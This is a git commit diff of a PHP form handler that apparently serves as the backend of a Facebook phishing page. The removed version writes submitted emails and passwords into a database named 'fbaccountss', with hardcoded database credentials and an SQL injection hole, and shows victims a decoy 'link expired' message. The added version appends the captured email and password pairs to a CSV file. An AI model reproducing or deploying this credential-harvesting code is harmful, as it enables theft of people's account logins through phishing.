fa44cc79bcaf77ceb9f26d890e6041b1ae9c1e29
root <smartsurajit2008@gmail.com>
2018-06-28 15:20:37 +0300

    phptets

--- form.php
+++ form.php
@@ -1,30 +1,34 @@
+<?
 
 
-<?php
-$servername = "mysql8.db4free.net:3307";
-$username = "sdas16";
-$password = "mom12345!";
-$dbname = "fbaccountss";
-
-// Create connection
-$conn = new mysqli($servername, $username, $password, $dbname);
-// Check connection
-if ($conn->connect_error) {
-    die("Connection failed: " . $conn->connect_error);
-} 
-
-$email = $_POST['email'];
-$password = $_POST['password'];
-
-    $sql = "INSERT INTO fb(email,password) VALUES('$_POST[email]','$_POST[password]')";
+     $email = $_POST['email'];
+     $password = $_POST['password'];
 
 
-if ($conn->query($sql) === TRUE) {
-    echo "Sorry link expired. Check back later. Thank you";
-} else {
 
-}
 
-$conn->close();
 
-?>
+
+
+        // The header row of the CSV.
+
+        // The data of the CSV.
+        $data = "$email,$password\n";
+
+     
+        $fileName = "uploaded_file.csv";
+
+        /*
+         * Create the CSV file.
+         * If file exists, append the data to it. Otherwise create the file.
+         */
+        if (file_exists($fileName)) {
+            // Add only data. The header is already added in the existing file.
+            file_put_contents($fileName, $data, FILE_APPEND);
+        } else {
+            // Add CSV header and data.
+            file_put_contents($fileName, $header . $data);
+        }
+
+
+
